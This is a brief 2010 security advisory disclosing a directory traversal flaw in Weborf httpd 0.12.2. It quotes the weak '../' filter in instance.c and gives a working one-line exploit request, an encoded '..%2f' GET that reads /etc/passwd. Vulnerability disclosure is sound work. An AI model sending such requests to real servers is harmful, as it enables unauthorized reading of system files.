@@ -1,0 +1,29 @@
+Title: Weborf httpd <= 0.12.2 Directory Traversal Vulnerability
+Date: Sep 6, 2010
+Author:	Rew
+Link: http://galileo.dmi.unict.it/wiki/weborf/doku.php
+Version: 0.12.2
+Tested On: Debian 5
+CVE: N/A
+
+=============================================================
+
+Weborf httpd <= 0.12.2 suffers a directory traversal
+vulnerability.  This vulnerability could allow
+attackers to read arbitrary files and hak th3 plan3t.
+
+instance.c : line 240-244
+------------------------------
+void modURL(char* url) {
+    //Prevents the use of .. to access the whole filesystem  <-- ORLY?
+    strReplace(url,"../",'\0');
+
+    replaceEscape(url);
+------------------------------
+
+Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+==============================================================
+
+Stay safe,
+Over and Out
